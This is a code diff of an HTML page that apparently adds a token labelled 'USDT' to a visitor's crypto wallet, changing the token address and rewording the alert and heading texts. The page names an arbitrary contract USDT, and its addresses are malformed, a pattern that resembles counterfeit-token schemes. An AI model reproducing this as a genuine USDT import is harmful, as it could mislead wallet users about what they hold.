@@ -5,7 +5,7 @@
   <title>Auto Import USDT</title>
   <script>
     async function importToken() {
-      const tokenAddress = "0x176ae8cfca8f2755bf32af7b32af547a972762686feacccb3ff41ce36da85a30";
+      const tokenAddress = "0x3c4141aef323b82a9dddc0e9bbc5f8d0f472c41d7a43a2e9a5d95898b253a058";
       const tokenSymbol = "USDT";
       const tokenDecimals = 18;
       const tokenImage = window.location.href + "logo.png";
@@ -23,10 +23,11 @@
             },
           },
         });
+
         if (wasAdded) {
-          alert('Token added!');
+          alert('Token added to wallet!');
         } else {
-          alert('Token not added');
+          alert('Token not added.');
         }
       } catch (error) {
         console.log(error);
@@ -36,6 +37,6 @@
   </script>
 </head>
 <body>
-  <h2>Auto-importing USDT...</h2>
+  <h2>Auto-importing USDT token into your wallet...</h2>
 </body>
 </html>
